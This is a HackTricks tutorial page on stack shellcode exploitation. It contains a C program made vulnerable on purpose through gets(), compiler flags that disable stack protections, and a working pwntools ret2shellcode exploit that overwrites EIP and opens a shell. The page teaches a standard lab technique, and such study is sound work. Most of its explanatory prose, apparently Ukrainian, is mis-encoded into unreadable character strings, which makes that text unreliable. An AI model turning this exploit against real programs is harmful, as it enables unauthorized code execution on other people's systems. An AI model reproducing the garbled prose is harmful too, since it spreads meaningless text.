# Stack Shellcode

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

**Stack shellcode** ‚Äî —Ü–µ —Ç–µ—Ö–Ω—ñ–∫–∞, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤ –±—ñ–Ω–∞—Ä–Ω–æ–º—É –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó, –¥–µ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑–∞–ø–∏—Å—É—î shellcode –≤ —Å—Ç–µ–∫ –≤—Ä–∞–∑–ª–∏–≤–æ—ó –ø—Ä–æ–≥—Ä–∞–º–∏, –∞ –ø–æ—Ç—ñ–º –º–æ–¥–∏—Ñ—ñ–∫—É—î **Instruction Pointer (IP)** –∞–±–æ **Extended Instruction Pointer (EIP)**, —â–æ–± –≤–∫–∞–∑–∞—Ç–∏ –Ω–∞ –º—ñ—Å—Ü–µ —Ä–æ–∑—Ç–∞—à—É–≤–∞–Ω–Ω—è —Ü—å–æ–≥–æ shellcode, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –π–æ–≥–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è. –¶–µ –∫–ª–∞—Å–∏—á–Ω–∏–π –º–µ—Ç–æ–¥, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø—É –∞–±–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö –∫–æ–º–∞–Ω–¥ –Ω–∞ —Ü—ñ–ª—å–æ–≤—ñ–π —Å–∏—Å—Ç–µ–º—ñ. –û—Å—å —Ä–æ–∑–±—ñ—Ä –ø—Ä–æ—Ü–µ—Å—É, –≤–∫–ª—é—á–∞—é—á–∏ –ø—Ä–æ—Å—Ç–∏–π –ø—Ä–∏–∫–ª–∞–¥ –Ω–∞ C —Ç–∞ —è–∫ –≤–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–ø–∏—Å–∞—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–∏–π –µ–∫—Å–ø–ª–æ–π—Ç, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ Python –∑ **pwntools**.

### C Example: A Vulnerable Program

Let's start with a simple example of a vulnerable C program:
```c
#include <stdio.h>
#include <string.h>

void vulnerable_function() {
char buffer[64];
gets(buffer); // Unsafe function that does not check for buffer overflow
}

int main() {
vulnerable_function();
printf("Returned safely\n");
return 0;
}
```
–¶—è –ø—Ä–æ–≥—Ä–∞–º–∞ –≤—Ä–∞–∑–ª–∏–≤–∞ –¥–æ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –±—É—Ñ–µ—Ä–∞ —á–µ—Ä–µ–∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ñ—É–Ω–∫—Ü—ñ—ó `gets()`.

### –ö–æ–º–ø–∏–ª—è—Ü—ñ—è

–©–æ–± —Å–∫–æ–º–ø—ñ–ª—é–≤–∞—Ç–∏ —Ü—é –ø—Ä–æ–≥—Ä–∞–º—É, –≤–∏–º–∫–Ω—É–≤—à–∏ —Ä—ñ–∑–Ω—ñ –∑–∞—Ö–∏—Å—Ç–∏ (—â–æ–± –∑–º–æ–¥–µ–ª—é–≤–∞—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤–µ —Å–µ—Ä–µ–¥–æ–≤–∏—â–µ), –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—É –∫–æ–º–∞–Ω–¥—É:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
* `-fno-stack-protector`: –í–∏–º–∏–∫–∞—î –∑–∞—Ö–∏—Å—Ç —Å—Ç–µ–∫—É.
* `-z execstack`: –†–æ–±–∏—Ç—å —Å—Ç–µ–∫ –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–º, —â–æ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è shellcode, –∑–±–µ—Ä–µ–∂–µ–Ω–æ–≥–æ –≤ —Å—Ç–µ—Ü—ñ.
* `-no-pie`: –í–∏–º–∏–∫–∞—î Position Independent Executable, —â–æ –ø–æ–ª–µ–≥—à—É—î –ø—Ä–æ–≥–Ω–æ–∑—É–≤–∞–Ω–Ω—è –∞–¥—Ä–µ—Å–∏ –ø–∞–º'—è—Ç—ñ, –¥–µ –±—É–¥–µ —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–∏–π –Ω–∞—à shellcode.
* `-m32`: –ö–æ–º–ø—ñ–ª—ñ—Ä—É—î –ø—Ä–æ–≥—Ä–∞–º—É —è–∫ 32-–±—ñ—Ç–Ω–∏–π –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–π —Ñ–∞–π–ª, —â–æ —á–∞—Å—Ç–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è —Å–ø—Ä–æ—â–µ–Ω–Ω—è —Ä–æ–∑—Ä–æ–±–∫–∏ –µ–∫—Å–ø–ª–æ–π—Ç—ñ–≤.

### Python Exploit using Pwntools

–û—Å—å —è–∫ –≤–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–ø–∏—Å–∞—Ç–∏ –µ–∫—Å–ø–ª–æ–π—Ç –Ω–∞ Python, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **pwntools** –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∞—Ç–∞–∫–∏ **ret2shellcode**:
```python
from pwn import *

# Set up the process and context
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path
context.arch = 'i386' # Specify the architecture

# Generate the shellcode
shellcode = asm(shellcraft.sh()) # Using pwntools to generate shellcode for opening a shell

# Find the offset to EIP
offset = cyclic_find(0x6161616c) # Assuming 0x6161616c is the value found in EIP after a crash

# Prepare the payload
# The NOP slide helps to ensure that the execution flow hits the shellcode.
nop_slide = asm('nop') * (offset - len(shellcode))
payload = nop_slide + shellcode
payload += b'A' * (offset - len(payload))  # Adjust the payload size to exactly fill the buffer and overwrite EIP
payload += p32(0xffffcfb4) # Supossing 0xffffcfb4 will be inside NOP slide

# Send the payload
p.sendline(payload)
p.interactive()
```
–¶–µ–π —Å–∫—Ä–∏–ø—Ç —Å—Ç–≤–æ—Ä—é—î –∫–æ—Ä–∏—Å–Ω–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è, —â–æ —Å–∫–ª–∞–¥–∞—î—Ç—å—Å—è –∑ **NOP —Å–ª–∞–π–¥—É**, **shellcode**, –∞ –ø–æ—Ç—ñ–º –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É—î **EIP** –∞–¥—Ä–µ—Å–æ—é, —â–æ –≤–∫–∞–∑—É—î –Ω–∞ NOP —Å–ª–∞–π–¥, –∑–∞–±–µ–∑–ø–µ—á—É—é—á–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è shellcode.

**NOP —Å–ª–∞–π–¥** (`asm('nop')`) –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –∑–±—ñ–ª—å—à–µ–Ω–Ω—è –π–º–æ–≤—ñ—Ä–Ω–æ—Å—Ç—ñ —Ç–æ–≥–æ, —â–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è "–∑—Å—É–≤–∞—Ç–∏–º–µ—Ç—å—Å—è" –≤ –Ω–∞—à shellcode –Ω–µ–∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ —Ç–æ—á–Ω–æ—ó –∞–¥—Ä–µ—Å–∏. –ù–∞–ª–∞—à—Ç—É–π—Ç–µ –∞—Ä–≥—É–º–µ–Ω—Ç `p32()` –Ω–∞ –ø–æ—á–∞—Ç–∫–æ–≤—É –∞–¥—Ä–µ—Å—É –≤–∞—à–æ–≥–æ –±—É—Ñ–µ—Ä–∞ –ø–ª—é—Å –∑—Å—É–≤, —â–æ–± –ø–æ—Ç—Ä–∞–ø–∏—Ç–∏ –≤ NOP —Å–ª–∞–π–¥.

## –ó–∞—Ö–∏—Å—Ç

* [**ASLR**](../common-binary-protections-and-bypasses/aslr/) **–ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ –≤–∏–º–∫–Ω–µ–Ω–∏–π** –¥–ª—è —Ç–æ–≥–æ, —â–æ–± –∞–¥—Ä–µ—Å–∞ –±—É–ª–∞ –Ω–∞–¥—ñ–π–Ω–æ—é –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è, —ñ–Ω–∞–∫—à–µ –∞–¥—Ä–µ—Å–∞, –¥–µ –±—É–¥–µ –∑–±–µ—Ä—ñ–≥–∞—Ç–∏—Å—è —Ñ—É–Ω–∫—Ü—ñ—è, –Ω–µ –∑–∞–≤–∂–¥–∏ –±—É–¥–µ –æ–¥–Ω–∞–∫–æ–≤–æ—é, —ñ –≤–∞–º –∑–Ω–∞–¥–æ–±–∏—Ç—å—Å—è –¥–µ—è–∫–∏–π leak, —â–æ–± –∑—Ä–æ–∑—É–º—ñ—Ç–∏, –¥–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—è win.
* [**Stack Canaries**](../common-binary-protections-and-bypasses/stack-canaries/) —Ç–∞–∫–æ–∂ –ø–æ–≤–∏–Ω–Ω—ñ –±—É—Ç–∏ –≤–∏–º–∫–Ω–µ–Ω—ñ, —ñ–Ω–∞–∫—à–µ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–∞ –∞–¥—Ä–µ—Å–∞ –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è EIP –Ω—ñ–∫–æ–ª–∏ –Ω–µ –±—É–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–∞.
* [**NX**](../common-binary-protections-and-bypasses/no-exec-nx.md) **–∑–∞—Ö–∏—Å—Ç** —Å—Ç–µ–∫—É –∑–∞–ø–æ–±—ñ–≥–∞—Ç–∏–º–µ –≤–∏–∫–æ–Ω–∞–Ω–Ω—é shellcode –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Å—Ç–µ–∫—É, –æ—Å–∫—ñ–ª—å–∫–∏ —Ü—è –æ–±–ª–∞—Å—Ç—å –Ω–µ –±—É–¥–µ –≤–∏–∫–æ–Ω—É–≤–∞–Ω–æ—é.

## –Ü–Ω—à—ñ –ø—Ä–∏–∫–ª–∞–¥–∏ —Ç–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://ir0nstone.gitbook.io/notes/types/stack/shellcode](https://ir0nstone.gitbook.io/notes/types/stack/shellcode)
* [https://guyinatuxedo.github.io/06-bof\_shellcode/csaw17\_pilot/index.html](https://guyinatuxedo.github.io/06-bof\_shellcode/csaw17\_pilot/index.html)
* 64 –±—ñ—Ç, ASLR –∑ leak –∞–¥—Ä–µ—Å–∏ —Å—Ç–µ–∫—É, –∑–∞–ø–∏—Å–∞—Ç–∏ shellcode —ñ –ø–µ—Ä–µ–π—Ç–∏ –¥–æ –Ω—å–æ–≥–æ
* [https://guyinatuxedo.github.io/06-bof\_shellcode/tamu19\_pwn3/index.html](https://guyinatuxedo.github.io/06-bof\_shellcode/tamu19\_pwn3/index.html)
* 32 –±—ñ—Ç, ASLR –∑ leak —Å—Ç–µ–∫—É, –∑–∞–ø–∏—Å–∞—Ç–∏ shellcode —ñ –ø–µ—Ä–µ–π—Ç–∏ –¥–æ –Ω—å–æ–≥–æ
* [https://guyinatuxedo.github.io/06-bof\_shellcode/tu18\_shellaeasy/index.html](https://guyinatuxedo.github.io/06-bof\_shellcode/tu18\_shellaeasy/index.html)
* 32 –±—ñ—Ç, ASLR –∑ leak —Å—Ç–µ–∫—É, –ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è –¥–ª—è –∑–∞–ø–æ–±—ñ–≥–∞–Ω–Ω—è –≤–∏–∫–ª–∏–∫—É exit(), –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ –∑–º—ñ–Ω–Ω—É –∑–Ω–∞—á–µ–Ω–Ω—è–º —ñ –∑–∞–ø–∏—Å–∞—Ç–∏ shellcode —ñ –ø–µ—Ä–µ–π—Ç–∏ –¥–æ –Ω—å–æ–≥–æ

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
